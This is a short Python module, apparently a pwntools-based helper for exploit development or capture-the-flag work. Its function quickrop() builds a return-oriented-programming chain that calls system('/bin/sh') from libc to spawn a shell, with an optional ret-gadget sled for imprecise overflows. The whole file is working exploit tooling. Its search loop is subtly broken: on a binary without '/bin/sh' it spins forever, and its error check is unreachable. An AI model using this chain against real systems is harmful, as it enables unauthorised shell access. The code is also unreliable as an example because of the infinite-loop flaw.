from pwnlib.rop import ROP
from pwnlib.util.packing import p64


# fast rop that should work given at least libc
# the chain is strange because it has to guarantee stack alignment which isn't easy
# todo: fix stack alignment by pivoting over to __pthread_keys or something
# this gadget seems to exist in every libc: `0x11129a: mov qword [rsi+0x10], rax ; ret ;`   
# so we can write 
# we should also have a 'retspam' argument that pads the start of the chain with ret gadgets
# so if you have a generic overflow but don't know where the return address exactly is you're still fine
# kinda like a nop sled
def quickrop(progs: 'list | ELF', ret: bool = False, badchars: bytes = b"") -> bytes:
    r = ROP(progs,badchars=badchars)
    binsh = None
    
    if ret:
        r.raw(r.find_gadget(["ret"])[0])
    
    for prog in r.elfs:
        if binsh:
            break
        while not (binsh := next(prog.search(b"/bin/sh\0"),None)):
            continue
            
    if binsh is None:
        raise Exception("no binsh string found D:")
        
    r.system(binsh)
    return r.chain()


__all__ = ["quickrop"]
